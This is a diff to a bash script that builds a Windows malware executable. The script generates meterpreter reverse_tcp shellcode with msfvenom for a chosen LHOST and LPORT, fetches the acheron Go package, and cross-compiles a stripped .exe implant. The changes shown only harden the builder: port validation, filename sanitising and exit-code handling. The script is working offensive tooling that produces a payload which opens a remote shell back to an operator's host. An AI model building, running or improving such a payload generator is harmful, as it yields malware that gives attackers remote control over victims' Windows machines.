@@ -29,10 +29,17 @@ if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
     exit 1
 fi
 
+# Validate LPORT: numeric, 1-65535
+if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1 ] || [ "$LPORT" -gt 65535 ]; then
+    echo "Error: LPORT must be numeric (1-65535)" >&2
+    exit 1
+fi
+
 # Normalize output filename (replace problematic chars)
 SANITIZED_LHOST=$(echo "$LHOST" | sed 's/[^a-zA-Z0-9._-]/_/g')
+SANITIZED_LPORT=$(echo "$LPORT" | sed 's/[^0-9]/_/g')
 WORKDIR=$(mktemp -d)
-OUTFILE="acheron_${SANITIZED_LHOST}_${LPORT}.exe"
+OUTFILE="acheron_${SANITIZED_LHOST}_${SANITIZED_LPORT}.exe"
 
 # Cleanup on exit
 trap 'rm -rf "${WORKDIR:-}"' EXIT INT TERM
@@ -46,7 +53,8 @@ err() { echo -e "\e[1;31m[-]\e[0m $*"; }
 info "Generating shellcode for $LHOST:$LPORT..."
 log "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hex EXITFUNC=thread"
 
-# Capture msfvenom output safely
+# Capture msfvenom output and exit code properly
+MSF_OUT=""
 if ! MSF_OUT=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hex EXITFUNC=thread 2>&1); then
     MSF_EXIT=$?
     err "msfvenom failed (exit $MSF_EXIT)"
@@ -95,16 +103,17 @@ GO_MOD_OUT=$(go mod init tmp 2>&1)
 
 log "Downloading dependencies (timeout 120s)..."
 timeout 120 go get github.com/f1zm0/acheron golang.org/x/sys/windows 2>&1 | tee "$WORKDIR/go_get.log"
-[ "$VERBOSE" = true ] && cat "$WORKDIR/go_get.log" | grep -v "go: downloading"
+[ "$VERBOSE" = true ] && grep -v "go: downloading" "$WORKDIR/go_get.log" || true
 
 info "Building GOOS=windows GOARCH=amd64..."
 log "GOOS=windows GOARCH=amd64 go build -v -ldflags=\"-s -w\" -o $OUTFILE main.go"
 log "Target: Windows x64 (amd64)"
 log "Strip flags: -s (symbols) -w (DWARF)"
 
-# Build with timeout, capture output
+# Build without set -e interference - run build in subshell, capture exit code
 log "Starting build (timeout 300s)..."
 (
+    set +e
     GOOS=windows GOARCH=amd64 timeout 300 go build -v -ldflags="-s -w" -o "$OUTFILE" main.go 2>&1
     echo "BUILD_EXIT:$?" > "$WORKDIR/build_exit_code"
 ) | tee "$WORKDIR/go_build.log" &
@@ -113,16 +122,16 @@ log "Build started (PID: $BUILD_PID). Waiting..."
 wait $BUILD_PID
 
 # Default to failure if exit code file missing
-BUILD_EXIT="${BUILD_EXIT:-1}"
+BUILD_EXIT=1
 if [ -f "$WORKDIR/build_exit_code" ]; then
     BUILD_EXIT=$(cat "$WORKDIR/build_exit_code" | cut -d: -f2)
 fi
 BUILD_OUT=$(cat "$WORKDIR/go_build.log" 2>/dev/null || echo "timeout or error")
 
-if [ "${BUILD_EXIT}" -eq 0 ]; then
+if [ "$BUILD_EXIT" -eq 0 ]; then
     cd - >/dev/null
     mv "$WORKDIR/$OUTFILE" "./$OUTFILE"
-    info "Generated: ./$OUTFILE ($(ls -lh "./$OUTFILE" | awk '{print \$5}'))"
+    info "Generated: ./$OUTFILE ($(ls -lh "./$OUTFILE" | awk '{print $5}'))"
     log "Binary: $(file "./$OUTFILE" 2>/dev/null || echo 'PE32+ executable')"
 else
     err "Build failed (exit $BUILD_EXIT)"
